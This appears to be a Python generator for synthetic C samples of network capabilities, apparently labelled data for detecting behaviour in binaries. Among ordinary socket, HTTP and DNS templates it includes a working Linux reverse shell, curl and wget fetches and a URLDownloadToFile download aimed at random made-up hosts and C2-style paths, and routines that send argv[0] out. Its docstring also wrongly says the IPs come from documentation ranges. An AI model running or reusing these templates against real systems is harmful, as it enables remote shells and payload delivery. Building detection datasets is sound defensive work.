"""Network capability variants. Hosts/IPs are randomised per sample from
documentation/test ranges and made-up domains."""
from common import T, c_str

NET = "network"
L_STD = ("stdio.h", "stdlib.h", "string.h", "unistd.h")
L_SOCK = L_STD + ("sys/socket.h", "netinet/in.h", "arpa/inet.h", "netdb.h")

TLDS = ["com", "net", "org", "info", "xyz", "top", "ru", "io", "cc", "biz", "online", "site"]
WORDS = ["update", "cdn", "api", "telemetry", "sync", "static", "cloud", "metrics", "mail", "files",
         "node", "edge", "dl", "secure", "panel", "srv", "data", "img", "push", "auth", "gate", "relay"]
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
    "curl/8.4.0", "Wget/1.21.4", "python-requests/2.31.0", "Go-http-client/1.1",
]
PATHS = ["/gate.php", "/api/v1/beacon", "/update/check", "/index.php?id=", "/panel/upload.php", "/c2/tasks",
         "/static/js/app.js", "/feed.xml", "/submit", "/config.bin", "/pixel.gif", "/ws"]


def host(rng):
    if rng.random() < 0.3:
        return f"{rng.choice(WORDS)}-{rng.choice(WORDS)}{rng.randint(1, 99)}.{rng.choice(TLDS)}"
    if rng.random() < 0.2:
        return "".join(rng.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(rng.randint(8, 16))) + "." + rng.choice(TLDS)
    return f"{rng.choice(WORDS)}.{rng.choice(WORDS)}{rng.choice(['', '-svc', 'hub', 'net'])}.{rng.choice(TLDS)}"


def ip(rng):
    a = rng.choice([45, 91, 103, 141, 176, 185, 193, 194, 198, 203, 5, 37, 62, 77, 80, 89])
    return f"{a}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"


def port(rng):
    return rng.choice([80, 443, 8080, 8443, 4444, 1337, 9001, 53, 6667, 2222, 5555, 31337, 8000])


def _lx_connect_ip(rng):
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    struct sockaddr_in sa; memset(&sa, 0, sizeof sa);
    sa.sin_family = AF_INET; sa.sin_port = htons(%d);
    sa.sin_addr.s_addr = inet_addr(%s);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return 0;
    if (connect(s, (struct sockaddr *)&sa, sizeof sa) == 0) {
        char hello[64]; int n = snprintf(hello, sizeof hello, "HELO %%d\n", (int)getpid());
        send(s, hello, n, 0);
        char buf[512]; recv(s, buf, sizeof buf, 0);
    }
    close(s);
    return 1;
}''' % (port(rng), c_str(ip(rng)))


def _lx_gai_http(rng):
    h = host(rng)
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    struct addrinfo hints, *res; memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(%s, "%d", &hints, &res) != 0) return 0;
    int s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (connect(s, res->ai_addr, res->ai_addrlen) == 0) {
        char req[512];
        int n = snprintf(req, sizeof req, "GET %s HTTP/1.1\r\nHost: %%s\r\nUser-Agent: %%s\r\nConnection: close\r\n\r\n", %s, %s);
        write(s, req, n);
        char buf[1024]; while (read(s, buf, sizeof buf) > 0) {}
    }
    close(s); freeaddrinfo(res);
    return 1;
}''' % (c_str(h), rng.choice([80, 8080, 443]), rng.choice(PATHS).replace("%", ""), c_str(h), c_str(rng.choice(UAS)))


def _dns_query_bytes(name):
    q = b""
    for part in name.split("."):
        q += bytes([len(part)]) + part.encode()
    return q + b"\0"


def _lx_udp_dns(rng):
    h = host(rng)
    from common import c_bytes
    qn = _dns_query_bytes(h)
    return r'''
static const unsigned char @F_q[] = {%s};
__attribute__((noinline)) int @F(int argc, char **argv) {
    unsigned char pkt[512]; int n = 0;
    pkt[n++] = 0x13; pkt[n++] = 0x37; pkt[n++] = 0x01; pkt[n++] = 0x00;  /* id, RD */
    pkt[n++] = 0; pkt[n++] = 1; pkt[n++] = 0; pkt[n++] = 0; pkt[n++] = 0; pkt[n++] = 0; pkt[n++] = 0; pkt[n++] = 0;
    memcpy(pkt + n, @F_q, sizeof @F_q); n += sizeof @F_q;
    pkt[n++] = 0; pkt[n++] = %d; pkt[n++] = 0; pkt[n++] = 1;   /* QTYPE, QCLASS IN */
    struct sockaddr_in r; memset(&r, 0, sizeof r);
    r.sin_family = AF_INET; r.sin_port = htons(53); inet_pton(AF_INET, %s, &r.sin_addr);
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sendto(s, pkt, n, 0, (struct sockaddr *)&r, sizeof r);
    unsigned char ans[512]; socklen_t sl = sizeof r;
    int got = recvfrom(s, ans, sizeof ans, 0, (struct sockaddr *)&r, &sl);
    close(s);
    return got;
}''' % (c_bytes(qn), rng.choice([1, 16, 28]), c_str(rng.choice(["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"])))


def _lx_revshell(rng):
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    struct sockaddr_in a; memset(&a, 0, sizeof a);
    a.sin_family = AF_INET; a.sin_port = htons(%d); a.sin_addr.s_addr = inet_addr(%s);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(s, (struct sockaddr *)&a, sizeof a) != 0) return 0;
    dup2(s, 0); dup2(s, 1); dup2(s, 2);
    char *args[] = {"/bin/sh", "-i", NULL};
    execve(args[0], args, NULL);
    return 1;
}''' % (port(rng), c_str(ip(rng)))


def _lx_listen(rng):
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    int s = socket(AF_INET, SOCK_STREAM, 0), on = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, sizeof on);
    struct sockaddr_in a; memset(&a, 0, sizeof a);
    a.sin_family = AF_INET; a.sin_port = htons(%d); a.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(s, (struct sockaddr *)&a, sizeof a) || listen(s, 4)) return 0;
    int c = accept(s, NULL, NULL);
    char cmd[256]; ssize_t n = recv(c, cmd, sizeof cmd - 1, 0);
    if (n > 0) { cmd[n] = 0; send(c, "ok\n", 3, 0); }
    close(c); close(s);
    return (int)n;
}''' % port(rng)


def _lx_raw_syscall(rng):
    p = port(rng)
    o = [int(x) for x in ip(rng).split(".")]
    addr = (o[3] << 24) | (o[2] << 16) | (o[1] << 8) | o[0]
    return r'''
static long @F_sys3(long n, long a, long b, long c) {
    long r;
    __asm__ volatile("syscall" : "=a"(r) : "a"(n), "D"(a), "S"(b), "d"(c) : "rcx", "r11", "memory");
    return r;
}
__attribute__((noinline)) int @F(int argc, char **argv) {
    unsigned char sa[16] = {2, 0, %d, %d, %d, %d, %d, %d};   /* AF_INET, port, ip */
    long s = @F_sys3(41 /* socket */, 2, 1, 0);
    if (s < 0) return 0;
    long r = @F_sys3(42 /* connect */, s, (long)sa, 16);
    @F_sys3(3 /* close */, s, 0, 0);
    return r == 0;
}''' % (p >> 8, p & 0xFF, addr & 0xFF, (addr >> 8) & 0xFF, (addr >> 16) & 0xFF, addr >> 24)


def _lx_curl_popen(rng):
    url = f"http://{host(rng)}{rng.choice(PATHS)}"
    tool = rng.choice([f"curl -fsSL {url}", f"wget -qO- {url}", f"curl -s -A '{rng.choice(UAS)}' {url}"])
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    char buf[4096]; size_t n = 0;
    FILE *p = popen(%s, "r");
    if (!p) return 0;
    n = fread(buf, 1, sizeof buf, p);
    pclose(p);
    return (int)n;
}''' % c_str(tool)


def _lx_gethostbyname(rng):
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    struct hostent *he = gethostbyname(%s);
    if (!he) return 0;
    struct sockaddr_in a; memset(&a, 0, sizeof a);
    a.sin_family = AF_INET; a.sin_port = htons(%d);
    memcpy(&a.sin_addr, he->h_addr_list[0], he->h_length);
    int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    int ok = connect(s, (struct sockaddr *)&a, sizeof a) == 0;
    if (ok) send(s, argv[0], strlen(argv[0]), 0);
    close(s);
    return ok;
}''' % (c_str(host(rng)), port(rng))


for i, fn in enumerate([_lx_connect_ip, _lx_gai_http, _lx_udp_dns, _lx_revshell, _lx_listen,
                        _lx_curl_popen, _lx_gethostbyname], 1):
    T(f"net.linux.{fn.__name__.strip('_')[3:]}.v{i}", "net.linux_sock", NET, "linux", fn, inc=L_SOCK)
T("net.linux.raw_syscall.v8", "net.linux_rawsys", NET, "linux", _lx_raw_syscall, inc=L_STD, arch="x86_64")

W_SOCK = ("winsock2.h", "ws2tcpip.h", "windows.h", "stdio.h", "string.h")


def _w_connect(rng):
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    WSADATA w; if (WSAStartup(MAKEWORD(2, 2), &w)) return 0;
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in a; memset(&a, 0, sizeof a);
    a.sin_family = AF_INET; a.sin_port = htons(%d); a.sin_addr.s_addr = inet_addr(%s);
    int ok = connect(s, (struct sockaddr *)&a, sizeof a) == 0;
    if (ok) send(s, "HELLO", 5, 0);
    closesocket(s); WSACleanup();
    return ok;
}''' % (port(rng), c_str(ip(rng)))


def _w_gai(rng):
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    WSADATA w; WSAStartup(MAKEWORD(2, 2), &w);
    struct addrinfo hints, *res = 0; memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(%s, "%d", &hints, &res)) return 0;
    SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    int ok = connect(s, res->ai_addr, (int)res->ai_addrlen) == 0;
    char req[512]; int n = snprintf(req, sizeof req, "GET %s HTTP/1.1\r\nHost: %%s\r\nUser-Agent: %s\r\n\r\n", "x");
    if (ok) { send(s, req, n, 0); char b[1024]; recv(s, b, sizeof b, 0); }
    closesocket(s); freeaddrinfo(res);
    return ok;
}''' % (c_str(host(rng)), port(rng), rng.choice(PATHS), rng.choice(UAS).replace('"', ''))


def _w_wininet(rng):
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    HINTERNET h = InternetOpenA(%s, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!h) return 0;
    HINTERNET u = InternetOpenUrlA(h, %s, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    char buf[2048]; DWORD got = 0, tot = 0;
    while (u && InternetReadFile(u, buf, sizeof buf, &got) && got) tot += got;
    if (u) InternetCloseHandle(u);
    InternetCloseHandle(h);
    return (int)tot;
}''' % (c_str(rng.choice(UAS)), c_str("http://" + host(rng) + rng.choice(PATHS)))


def _w_winhttp(rng):
    h = host(rng)
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    HINTERNET s = WinHttpOpen(L"Updater/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return 0;
    HINTERNET c = WinHttpConnect(s, L"%s", INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET r = c ? WinHttpOpenRequest(c, L"POST", L"%s", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE) : 0;
    BOOL ok = r && WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, argv[0], (DWORD)strlen(argv[0]), (DWORD)strlen(argv[0]), 0);
    if (ok) ok = WinHttpReceiveResponse(r, NULL);
    if (r) WinHttpCloseHandle(r);
    if (c) WinHttpCloseHandle(c);
    WinHttpCloseHandle(s);
    return ok;
}''' % (h, rng.choice(PATHS))


def _w_urlmon(rng):
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    char path[MAX_PATH]; GetTempPathA(sizeof path, path); strcat(path, "%s");
    HRESULT hr = URLDownloadToFileA(NULL, %s, path, 0, NULL);
    return hr == S_OK;
}''' % (rng.choice(["upd.tmp", "data.bin", "cache.dat"]), c_str("https://" + host(rng) + rng.choice(PATHS)))


def _w_dns(rng):
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    PDNS_RECORD rec = NULL;
    DNS_STATUS st = DnsQuery_A(%s, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &rec, NULL);
    if (st == 0 && rec) { DnsRecordListFree(rec, DnsFreeRecordList); return 1; }
    return 0;
}''' % c_str(host(rng))


def _w_udp(rng):
    return r'''
__attribute__((noinline)) int @F(int argc, char **argv) {
    WSADATA w; WSAStartup(MAKEWORD(2, 2), &w);
    SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in a; memset(&a, 0, sizeof a);
    a.sin_family = AF_INET; a.sin_port = htons(%d); inet_pton(AF_INET, %s, &a.sin_addr);
    char msg[64]; int n = snprintf(msg, sizeof msg, "ping %%d", argc);
    sendto(s, msg, n, 0, (struct sockaddr *)&a, sizeof a);
    char b[256]; int fl = sizeof a; recvfrom(s, b, sizeof b, 0, (struct sockaddr *)&a, &fl);
    closesocket(s);
    return n;
}''' % (port(rng), c_str(ip(rng)))


T("net.win.connect.v1", "net.win_sock", NET, "windows", _w_connect, inc=W_SOCK, libs=("ws2_32",))
T("net.win.gai_http.v2", "net.win_sock", NET, "windows", _w_gai, inc=W_SOCK, libs=("ws2_32",))
T("net.win.udp.v3", "net.win_sock", NET, "windows", _w_udp, inc=W_SOCK, libs=("ws2_32",))
T("net.win.wininet.v4", "net.win_http", NET, "windows", _w_wininet, inc=("windows.h", "wininet.h", "string.h"), libs=("wininet",))
T("net.win.winhttp.v5", "net.win_http", NET, "windows", _w_winhttp, inc=("windows.h", "winhttp.h", "string.h"), libs=("winhttp",))
T("net.win.urlmon.v6", "net.win_http", NET, "windows", _w_urlmon, inc=("windows.h", "urlmon.h", "string.h"), libs=("urlmon",))
T("net.win.dnsquery.v7", "net.win_dns", NET, "windows", _w_dns, inc=("windows.h", "windns.h"), libs=("dnsapi",))
